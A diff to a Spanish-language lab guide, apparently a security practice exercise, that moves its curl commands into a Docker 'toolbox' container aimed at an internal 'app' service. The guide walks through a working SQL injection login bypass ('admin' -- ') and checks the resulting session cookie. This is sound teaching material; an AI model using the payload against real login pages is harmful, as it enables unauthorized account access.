@@ -1,25 +1,27 @@
 # Paso 2 — Bypass manual con curl
 
+Estos comandos los corremos con el `curl` del contenedor `toolbox` (mismo que usamos en la práctica anterior), apuntando a `app:8888` — el servicio de la app por su nombre en la red interna.
+
 ## 2.1 — Confirmar el comportamiento normal
 
 Un intento con una contraseña cualquiera falla y devuelve `200` (la página de login, con el error):
 
 ```bash
-curl -s -o /dev/null -w "%{http_code}\n" \
+docker compose exec toolbox curl -s -o /dev/null -w "%{http_code}\n" \
   --data-urlencode "usuario=admin" \
   --data-urlencode "password=loquesea" \
-  http://127.0.0.1:8888/login
+  http://app:8888/login
 ```
 
 ## 2.2 — El payload
 
-Usamos `--data-urlencode` para que `curl` codifique correctamente la comilla y el espacio del payload:
+Usamos `--data-urlencode` para que `curl` codifique correctamente la comilla y el espacio del payload. La cookie que genera el login la guardamos dentro del propio contenedor `toolbox` (en `/tmp`, dura mientras siga corriendo):
 
 ```bash
-curl -s -c /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" \
+docker compose exec toolbox curl -s -c /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" \
   --data-urlencode "usuario=admin' -- " \
   --data-urlencode "password=loquesea" \
-  http://127.0.0.1:8888/login
+  http://app:8888/login
 ```
 
 Si ves `302` en vez de `200`, entraste. Un login exitoso redirige a `/`; uno fallido vuelve a mostrar el formulario con error.
@@ -27,7 +29,7 @@ Si ves `302` en vez de `200`, entraste. Un login exitoso redirige a `/`; uno fal
 ## 2.3 — Confirmar el acceso
 
 ```bash
-curl -s -b /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8888/
+docker compose exec toolbox curl -s -b /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" http://app:8888/
 ```
 
 `200` sin redirect: la cookie de sesión que generó el bypass te deja entrar al CRUD igual que un login legítimo.
